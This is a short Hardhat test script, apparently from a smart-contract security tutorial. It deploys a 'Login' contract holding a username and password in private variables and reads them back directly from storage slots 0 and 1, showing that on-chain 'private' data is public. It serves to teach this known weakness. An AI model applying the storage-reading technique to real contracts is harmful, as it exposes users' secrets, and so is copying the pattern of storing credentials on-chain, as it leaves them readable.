const { ethers } = require("hardhat");
const { expect } = require("chai");

describe("Attack", function () {
    it("Should be able to read the private variables password and username", async function () {
        // Deploy the login contract
        const loginFactory = await ethers.getContractFactory("Login");

        // To save space, we would convert the string to bytes32 array
        const usernameBytes = ethers.utils.formatBytes32String("Disha");
        const passwordBytes = ethers.utils.formatBytes32String("disha@123");


        const loginContract = await loginFactory.deploy(
            usernameBytes,
            passwordBytes
        );
        await loginContract.deployed();

        // Get the storage at storage slot 0,1
        const slot0Bytes = await ethers.provider.getStorageAt(
            loginContract.address,
            0
        );
        const slot1Bytes = await ethers.provider.getStorageAt(
            loginContract.address,
            1
        );

        // We are able to extract the values of the private variables
        expect(ethers.utils.parseBytes32String(slot0Bytes)).to.equal("Disha");
        console.log('name--', ethers.utils.parseBytes32String(slot0Bytes));
        expect(ethers.utils.parseBytes32String(slot1Bytes)).to.equal("disha@123");
        console.log('password::', ethers.utils.parseBytes32String(slot1Bytes));
    });
});